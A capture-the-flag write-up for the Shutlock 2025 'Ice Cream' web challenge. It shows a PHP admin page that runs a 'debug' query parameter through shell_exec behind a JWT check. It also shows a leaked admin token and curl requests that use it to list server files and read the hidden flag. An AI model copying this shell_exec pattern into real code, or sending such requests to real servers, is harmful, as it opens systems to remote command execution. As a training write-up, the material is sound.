# Ice Cream - Shutlock 2025

> Bienvenue dans le challenge Ice Cream !
>
> Tu dois trouver l’ingrédient secret des glaces de "PAPI glace", le plus grand vendeur de glace de tout Cannes.

![alt text](images/shutlock2025_icecream_home.png)

## playing around

`/?dir=&file=secret`

![alt text](images/shutlock2025_icecream_project.png)

## `admin.php` content

```php
<?php
$canExecute = false;
$secret = trim(file_get_contents('jwt_secret.txt'));

$adminToken = trim(file_get_contents('role.txt'));

function base64url_encode($data) {
    return rtrim(strtr(base64_encode($data), '+/', '-_'), '=');
}

function base64url_decode($data) {
    return base64_decode(strtr($data, '-_', '+/'));
}

function verify_jwt_hs256($jwt, $secret) {
    $parts = explode('.', $jwt);
    if (count($parts) !== 3) return false;

    list($header_b64, $payload_b64, $sig_b64) = $parts;
    $expected_sig = base64url_encode(hash_hmac('sha256', "$header_b64.$payload_b64", $secret, true));

    if (!hash_equals($expected_sig, $sig_b64)) return false;

    return json_decode(base64url_decode($payload_b64), true);
}

function is_admin($jwt, $secret, $adminRole) {
    $payload = verify_jwt_hs256($jwt, $secret);
    if (!$payload) return false;
    return isset($payload['role']) && strtoupper(trim($payload['role'])) === strtoupper(trim($adminRole));
}

if (isset($_COOKIE['auth'])){
    if (is_admin($_COOKIE['auth'], $secret, $adminToken)) {


    $canExecute = true;
    }
}

if (!$canExecute) {
    $header = base64url_encode(json_encode(['alg' => 'HS256', 'typ' => 'JWT']));
    $payload = base64url_encode(json_encode(['role' => 'simple-utilisateur']));
    $signature = base64url_encode(hash_hmac('sha256', "$header.$payload", $secret, true));

    $jwt = "$header.$payload.$signature";

    setcookie('auth', $jwt, time() + 3600, "/");
    $_COOKIE['auth'] = $jwt;
}

if ($_SERVER['REQUEST_METHOD'] === 'GET' && isset($_GET['debug'])) {
    if (!$canExecute) {
        echo "<p>Tu ne peux pas executer de commandes avec debug tant que tu n'es pas authentifié en tant qu'admin</p>";
        exit;
    }

    $cmd = $_GET['debug'];
    $output = shell_exec($cmd);
    echo "<pre>$output</pre>";
    exit;
}
?>
```

by reading the code, we can either generate or own JWT token with content from `jwt_secret.txt` and `role.txt`.

we also know that running `/?debug=` will execute the command in the parameter `debug` if we are authenticated as an admin.

## grabing the token

remember the project directory before ? there was an `admin.txt` file that we could not read due to verifications, well we can actually go to `/admin.txt` and we'll get the content of the file.

```
eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogIlBBUEktSkUtU1VJUy1VTi1BRE1JTiJ9.EoXe8aAMjtu1gitwv1qWMRI2hszN_tdkZO5K9F-3Kes
```

## running commands

we can now try to `ls` all the files in the project directory by running `ls -la ./*`

```bash
$ curl 'http://57.128.112.118:12233/?debug=ls%20-la%20./*' \
  -b 'auth=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogIlBBUEktSkUtU1VJUy1VTi1BRE1JTiJ9.EoXe8aAMjtu1gitwv1qWMRI2hszN_tdkZO5K9F-3Kes'

-rw-r--r-- 1 root root  1844 Jun 22 14:49 ./admin.php
-rw-r--r-- 1 root root   129 May 29 10:39 ./admin.txt
-rw-r--r-- 1 root root  1980 May 29 10:39 ./auth.php
-rw-r--r-- 1 root root 12289 May 29 10:39 ./flavors.db
-rw-r--r-- 1 root root  3597 Jun 21 19:34 ./index.php
-rw-r--r-- 1 root root     8 May 29 10:39 ./jwt_secret.txt
-rw-r--r-- 1 root root    21 Jun 21 19:34 ./role.txt
-rw-r--r-- 1 root root  2925 May 29 10:39 ./styles.css

./ingredients:
total 28
drwxr-xr-x 2 root     root     4096 May 29 10:39 .
drwxrwxrwt 1 www-data www-data 4096 Jun 22 14:50 ..
-rw-r--r-- 1 root     root      112 May 29 10:39 chocolat
-rw-r--r-- 1 root     root       91 May 29 10:39 lait
-rw-r--r-- 1 root     root      122 May 29 10:39 secret
-rw-r--r-- 1 root     root       29 May 29 10:39 sucre
-rw-r--r-- 1 root     root       48 May 29 10:39 vanille

./secrets:
total 16
drwxr-xr-x 2 root     root     4096 May 29 10:39 .
drwxrwxrwt 1 www-data www-data 4096 Jun 22 14:50 ..
-rw-r--r-- 1 root     root       21 May 29 10:39 .recette_de_papi
-rw-r--r-- 1 root     root      126 May 29 10:39 ingrédient secret
```

looks like `secrets` directory contains an `.recette_de_papi` file that was hidden from us before, we can read it by running `cat secrets/.recette_de_papi`.

```bash
$ curl 'http://57.128.112.118:12233/?debug=cat%20secrets/.recette_de_papi' \
  -b 'auth=eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJyb2xlIjogIlBBUEktSkUtU1VJUy1VTi1BRE1JTiJ9.EoXe8aAMjtu1gitwv1qWMRI2hszN_tdkZO5K9F-3Kes'

SHLK{Ic3_Cr3am_L0v3r}
```

there we go, we got the flag!
